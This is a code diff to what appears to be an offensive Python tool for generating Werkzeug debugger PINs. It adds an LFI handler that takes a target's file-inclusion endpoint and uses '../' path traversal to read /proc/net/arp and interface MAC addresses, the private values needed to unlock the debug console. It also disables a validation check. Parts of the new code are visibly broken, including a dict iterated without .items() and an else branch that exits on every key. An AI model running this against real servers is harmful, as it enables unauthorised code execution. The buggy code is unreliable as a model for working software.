@@ -144,6 +144,27 @@ def generate_pin(
 
     return rv 
 
+def lfi_handler(data: dict):
+    public_keys = (
+        "usernames",
+        "modnames",
+        "appnames",
+        "paths"
+    )
+    missing = []
+    for key, value in data:
+        if value == [""] and key in ("machine_id", "node_uuid"):
+            missing.append(key)
+        else:
+            # NOTE: Attempt to append the missisng data
+            vial.log.critical("Missing public bits. Please refer to the README.md and edit your config")
+            exit(1)
+
+    url = Prompt("Enter known LFI endpoint of target ")
+    base = "../../../../../../../../"
+    device_id = requests.get(url + base + "proc/net/arp").text
+    mac = requests.get(url + base + f"sys/class/net/{device_id}/address").text
+    print(device_id, mac)
 def pin_handler(config: str) -> bytes:
     """
     public_bits = [
@@ -160,7 +181,8 @@ def pin_handler(config: str) -> bytes:
     #NOTE: Parse config.toml and extract public/private bits.
     with open(config, "rb") as fd:
         data = tomllib.load(fd)["pin_gen"]
-
+    print(data["node_uuid"])
+    # NOTE: Exploit LFI to get private bits
     values = [
         data[bit] for bit in (
             "usernames",
@@ -171,41 +193,13 @@ def pin_handler(config: str) -> bytes:
             "machine_id"
         )
     ]
-    #data_bits = {
-    #    "public": [],
-    #    "private": []
-    #}
-    #data_bits["public"] = [
-    #    data[bit] for bit in (
-    #        "username",
-    #        "modname",
-    #        "app_name",
-    #        "paths"
-    #    )
-    #]
-    #data_bits["private"] = [
-    #    data[bit] for bit in (
-    #        "mac",
-    #        "machine-id"
-    #    )
-    #]
     vial.log.info(f"Using config -> {config}:\n{data}")
     
-    #NOTE: Filter out the optional/empty bits
-    #combined_bits = ChainMap(public_bits, private_bits)
-    #values = [
-    #    value for value in combined_bits.values()
-    #    if value not in ("", [])
-    #]
-    #NOTE: Check if the required public/private bits exist.
-    #values = []
-    #for value_list in data_bits.values():
-    #    for value in value_list:
-    #        values.append(value)
-    if len(values) != len(data.keys()) - 1:
-        vial.log.critical("Missing required bits.")
-        exit(1)
+    #if len(values) != len(data.keys()) - 1:
+    #    vial.log.critical("Missing required bits.")
+    #    exit(1)
     #NOTE: Generate a PIN for all the combinations
+    
     combinations = product(*values)
     table = Table(title="Werkzeug Possible PINs")
     table.add_column("PINs", justify="left", style="green", no_wrap=True)
